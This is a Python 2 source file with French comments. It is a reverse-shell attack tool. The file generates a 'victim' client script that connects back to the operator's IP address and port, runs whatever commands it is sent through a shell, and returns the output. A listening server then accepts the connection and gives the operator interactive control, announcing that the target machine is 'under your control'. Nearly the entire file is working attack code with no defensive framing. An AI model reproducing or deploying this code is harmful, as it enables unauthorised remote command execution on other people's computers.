import socket
import sys 
import subprocess
import time 





def generation_du_script_de_la_victime():
		
	print "[!]	generation  de script pour la victime "
	for i in range(1,5):
		print "..."
		time.sleep(0.4)
	ifconfig = subprocess.Popen('ifconfig wlan0 | grep \'inet adr\' | cut -d \":\" -f 2 | cut -d \" \" -f 1',shell=True,stdout = subprocess.PIPE) 
	addr = ifconfig.stdout.read().strip('\n')
	addr ="\""+addr+"\""
	client_file = open("Client_test.py",'w')
	script = str('import socket \nimport os\nimport subprocess\nimport time \nglobal s \ns = socket.socket()\nglobal host \nhost ='+addr+'\nglobal port\nport = '+str(sys.argv[1])+'\ndef connect() :\n\n\ttry : \n\t\ts.connect((host,port))\n\t\ts.send(os.getcwd())\n\texcept :\n\t\tconnect()\n\ndef giving_control():\n\twhile True:\n\t\tdata = s.recv(1024)\n#traitement:\n\t\tif len(data)>0 :\n\n#traiter la commande \'cd\' a part \n\t\t\tif str(data[:2]) == "cd":\n\t\t\t\ts.send(os.chdir(str(data[3:])))\n\t\t\t\ttime.sleep(1)\n\t\t\telse:\n\t\t\t\tcmd = subprocess.Popen(str(data[:]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        \t\t\toutput = cmd.stdout.read() + cmd.stderr.read() \n        \t\t\ts.send(str(output + os.getcwd() ))\n\t\t\t\ttime.sleep(1)\n\t\telse:\n\t\t\ts.send(os.getcwd())\n\t\t\ttime.sleep(1)\n\n\ndef main():\n\tconnect()\n\tgiving_control()\n\nmain()')
	client_file.write(script)
	client_file.close()
	print  "[!] OK "
	


		
def creation_de_socket():
	global host 
	global port 
	global s
	port = int(sys.argv[1])
	host = ''  # specifie que la socket is reachable by any address la  machine happens to have
	try :
		s = socket.socket() 
# *  socket() creates an endpoint for communication
# * it is only given a protocol family, but not assigned an address
# * socket() takes three arguments: domain(AF_INET , AF_INET6 , ...),
#   type(SOCKET_STREAM,SOCK_DGRAM....),protocole on specifie le protocol niveau transport qu'on va utliser (  IPPROTO_TCP, IPPROTO_UDP)
		print "[+]	Creation de socket  "
	except Exception,e :
		print "[-] Erreur de creation de socket  : " + e
	
def bind_and_listen():
	print "[+]	Binding ... "
	try :
		s.bind((host,port))
		print "[+]	Listening ... "
		s.listen(5) 	# * causes socket to enter listening state.
						# * the argument(backlog) to listen tells the socket  that we want it 
						#   to queue up as many as 5 connect requests (the normal max) before refusing outside connections.
		print "[!]	Le server attend maintenant la victime  ...  "
	except Exception,e:
		print "[-] Erreur dans la fonction BIND() ou LISTEN() : " + e 
		print " Relancement des fonctions ... " 
		bind_and_listen()
	
	
def accept():
	connection,client_param = s.accept() # * It accepts a received incoming attempt to create a new TCP connection from the remote client, 
					     #   and creates a new socket associated with the socket address pair of this connection and removes the connection from the listen queue
	print "[!]	Connection de la victime      [!]" 
	for i in range(1,5):
		print "..."
		time.sleep(0.5)
		

	print "[!] 	La machine cible est sous votre controle \n "
	print "[!]	L'adresse IP de la victime  est : "+str(client_param[0])+ " depuis le port "+ str(client_param[1])
	
	control(connection)
	connection.close()
	
def control(connection):
	
	time.sleep(1)
	print str(connection.recv(1024))
	while True:
		cmd = raw_input()
		if cmd == "kill" :
			connection.close()
			s.close()
			sys.exit(0)
		if len(str(cmd)) > 0:
			connection.send(str(cmd))
			time.sleep(1)
			client_response = str(connection.recv(20000)) # * buffer size  grand au cas ou on lance une commande avec un
									      #   resultat tres grand comme ' ps -ef '
			print client_response

def reverse():
		
	if len(sys.argv) == 2 : # le premier argv c a d argv[0] contient le nom du script
		print "    \t \t \t \t bienvenue !\n"
		print "  "
		print "Everything is possible , the impossible is merely something you don't know how to do it,YET. \n \n " 
		generation_du_script_de_la_victime()
		creation_de_socket()
		bind_and_listen()
		accept()

	else:
	
		print "ajouter comment argument le port du listening  "
	
	
	
	
	
	
	
	
	
	
	
	
